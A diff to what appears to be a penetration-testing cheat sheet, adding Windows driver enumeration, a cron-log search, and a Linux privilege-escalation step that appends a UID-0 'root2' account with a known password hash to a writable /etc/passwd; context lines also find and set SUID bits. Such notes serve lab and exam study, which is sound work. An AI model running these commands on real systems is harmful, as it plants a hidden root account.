@@ -1047,6 +1047,7 @@ wmic qfe get Caption, Description, HotFixID, InstalledOn
 wmic logicaldisk get caption,description,providername
 mountvol
 Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} #get kernel modules and device drivers
+driverquery /v # get drivers installed on system
 ```
 
 ## User Enumeration
@@ -1204,6 +1205,17 @@ Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.
 find / -user root -perm -4000 2>/dev/null
 # Set UID bit
 chmod u+s /script
+```
+## Search for executed cronjobs
+```
+grep "CRON" /var/log/cron.log
+```
+
+## Add user in /etc/passwd (if writable)
+```
+openssl passwd evil
+echo "root2:Ur0xZo454Kq1s:0:0:root:/root/:/bin/bash" >> /etc/passwd
+su root2 # passwd:evil
 ```
 
 ### Example (node@htb)
